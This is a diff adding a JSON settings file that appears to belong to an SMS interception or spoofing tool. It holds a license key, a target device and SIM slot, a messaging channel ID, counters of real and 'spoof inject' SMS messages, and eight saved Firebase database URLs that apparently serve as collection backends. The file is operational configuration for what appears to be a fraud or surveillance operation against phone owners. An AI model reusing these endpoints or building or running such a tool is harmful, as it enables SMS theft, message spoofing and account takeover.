@@ -1,0 +1,52 @@
+{
+  "user_id": "8674057370",
+  "license_key": "KEY-YMCC-ZXST-4D32",
+  "firebase_url": "https://kajal-fe245-default-rtdb.firebaseio.com",
+  "auth_key": "https://kajal-fe245-default-rtdb.firebaseio.com",
+  "selected_device_id": "2fe0031faac68b09",
+  "selected_sim_slot": 1,
+  "channel_id": "-1004328375505",
+  "is_polling_active": false,
+  "last_timestamp": 0,
+  "last_updated": "2026-10-24T15:38:41.192470+00:00",
+  "stats_tokens_sent": 0,
+  "stats_real_sms": 36,
+  "stats_spoof_injects": 61,
+  "ignore_initial_messages": false,
+  "saved_firebases": [
+    {
+      "url": "https://super-7fcd6-default-rtdb.firebaseio.com",
+      "auth": "https://super-7fcd6-default-rtdb.firebaseio.com"
+    },
+    {
+      "url": "https://nxt-fire-6bd1f-default-rtdb.firebaseio.com",
+      "auth": "https://nxt-fire-6bd1f-default-rtdb.firebaseio.com"
+    },
+    {
+      "url": "https://admin51-50a43-default-rtdb.firebaseio.com",
+      "auth": "https://admin51-50a43-default-rtdb.firebaseio.com"
+    },
+    {
+      "url": "https://xxxx-5ece9-default-rtdb.firebaseio.com",
+      "auth": "https://xxxx-5ece9-default-rtdb.firebaseio.com"
+    },
+    {
+      "url": "https://tata-1d605-default-rtdb.firebaseio.com",
+      "auth": "https://tata-1d605-default-rtdb.firebaseio.com"
+    },
+    {
+      "url": "https://abhi-3-89519-default-rtdb.firebaseio.com",
+      "auth": "https://abhi-3-89519-default-rtdb.firebaseio.com"
+    },
+    {
+      "url": "https://sumit-1c42f-default-rtdb.firebaseio.com",
+      "auth": "https://sumit-1c42f-default-rtdb.firebaseio.com"
+    },
+    {
+      "url": "https://kajal-fe245-default-rtdb.firebaseio.com",
+      "auth": "https://kajal-fe245-default-rtdb.firebaseio.com"
+    }
+  ],
+  "last_message_id": 1792855705528,
+  "monitor_start_time": 1792854163.730078
+}
